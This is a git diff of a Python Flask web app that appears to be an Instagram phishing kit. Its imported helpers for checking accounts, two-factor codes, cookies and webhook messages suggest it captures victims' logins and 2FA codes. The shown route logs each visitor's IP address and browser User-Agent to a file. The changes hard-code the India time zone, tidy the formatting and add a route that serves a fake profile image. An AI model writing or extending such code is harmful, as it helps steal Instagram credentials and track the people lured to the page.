@@ -2,9 +2,10 @@ import pytz
 import datetime
 import time
 import logging
-from flask import Flask, render_template, request, redirect
-from app.instagram_api import IsExists,two_factor
-from app.functions import  edit_cookies, first_art, correct_all, wrong_answer, twoFA_active,twoFA_correct, send_webhook_message
+import os
+from flask import Flask, render_template, request, redirect, send_from_directory
+from app.instagram_api import IsExists, two_factor
+from app.functions import edit_cookies, first_art, correct_all, wrong_answer, twoFA_active, twoFA_correct, send_webhook_message
 from colorama import Fore, Style
 import concurrent.futures
 
@@ -19,23 +20,19 @@ params = None
 
 @app.route('/')
 def index():
-    global user_agent,params
+    global user_agent, params
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
 
-    time_zone = time.tzname[0]
-    utc_now = datetime.datetime.now(datetime.timezone.utc)
+    # Directly specify India Time Zone (IST)
     try:
-        if time_zone.startswith(("+", "-")) or time_zone.isdigit():
-            offset_hours = int(time_zone.replace("+", "").replace("-", ""))
-            user_tz = pytz.FixedOffset(offset_hours * 60)  
-        else:
-            user_tz = pytz.timezone(time_zone)
+        user_tz = pytz.timezone('Asia/Kolkata')
+        utc_now = datetime.datetime.now(datetime.timezone.utc)
         user_now = utc_now.astimezone(user_tz)
         visit_time = user_now.strftime("%Y-%m-%d %H:%M:%S")
-    except pytz.UnknownTimeZoneError:
-        print("Geçersiz saat dilimi:", time_zone)
-        user_tz = pytz.utc 
+    except Exception as e:
+        print("Invalid time zone:", e)
+        utc_now = datetime.datetime.now(datetime.timezone.utc)
         visit_time = utc_now.strftime("%Y-%m-%d %H:%M:%S")
     
     if user_agent is not None:
@@ -43,11 +40,17 @@ def index():
         with open('output/ip_agent.log', 'a') as f:
             f.write(f"\n\n\n\nEnter website in: {visit_time} \nIP: {user_ip}\nUser-Agent: {user_agent}\n")
     params = {
-                "display_type": "none"
+        "display_type": "none"
     }
-    return render_template('index.html',params=params)
+    return render_template('index.html', params=params)
 
 
+# --- NAYA ROUTE: Profile image serve karne ke liye ---
+@app.route('/profile-image')
+def profile_image():
+    directory = os.path.abspath('Image/Profile')
+    filename = 'IMG_20260904_215747_767.webp'
+    return send_from_directory(directory, filename)
 
 
 @app.route('/submit', methods=['POST'])
